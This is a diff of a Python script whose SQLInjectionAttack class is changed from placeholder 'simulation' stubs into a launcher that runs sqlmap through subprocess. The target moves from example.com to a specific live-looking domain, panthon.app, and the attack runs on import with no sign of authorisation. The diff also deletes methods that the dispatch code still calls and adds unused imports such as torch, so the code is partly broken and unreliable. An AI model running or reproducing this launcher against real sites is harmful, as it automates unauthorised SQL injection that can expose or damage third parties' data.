@@ -1,11 +1,19 @@
+import torch
+import torch.nn as nn
+from random_string_generator import RandomStringGenerator
+import logging
+import subprocess
+import os
+
+
 class SQLInjectionAttack:
-    def __init__(self, target_url, attack_type="Basic"):
+    def __init__(self, target_url, attack_type="sqlmap"):
         self.target_url = target_url
         self.attack_type = attack_type
 
     def simulate_attack(self):
-        if self.attack_type == "Basic":
-            self.basic_sql_injection_attack()
+        if self.attack_type == "sqlmap":
+            self.sqlmap_attack()
         elif self.attack_type == "TimeBasedBlind":
             self.time_based_blind_attack()
         elif self.attack_type == "ErrorBased":
@@ -15,38 +23,14 @@ class SQLInjectionAttack:
         else:
             raise ValueError("Invalid attack type!")
 
-    def basic_sql_injection_attack(self):
-        # Simulate a basic SQL injection attack
-        logging.info("Simulating basic SQL Injection attack on %s...", self.target_url)
-        # Logic for the basic attack goes here
-        raise NotImplementedError
-
-    def time_based_blind_attack(self):
-        # Simulate a time-based blind SQL injection attack
-        logging.info(
-            "Simulating time-based blind SQL Injection attack on %s...", self.target_url
-        )
-        # Logic for the time-based blind attack goes here
-        raise NotImplementedError
-
-    def error_based_attack(self):
-        # Simulate an error-based SQL injection attack
-        logging.info(
-            "Simulating error-based SQL Injection attack on %s...", self.target_url
-        )
-        # Logic for the error-based attack goes here
-        raise NotImplementedError
-
-    def union_based_attack(self):
-        # Simulate a union-based SQL injection attack
-        logging.info(
-            "Simulating union-based SQL Injection attack on %s...", self.target_url
-        )
-        # Logic for the union-based attack goes here
-        raise NotImplementedError
+    def sqlmap_attack(self):
+        logging.info("Attacking %s with SQLMap...", self.target_url)
+        path_to_executable = os.path.join(os.path.dirname(__file__), "sqlmap/sqlmap.py")
+        command = ["python3", path_to_executable, "-u", self.target_url]
+        subprocess.run(command)
 
 
 sql_injection_attack = SQLInjectionAttack(
-    "https://example.com", attack_type="Basic"
+    "https://panthon.app", attack_type="sqlmap"
 )  # target_url, attack_type
 sql_injection_attack.simulate_attack()
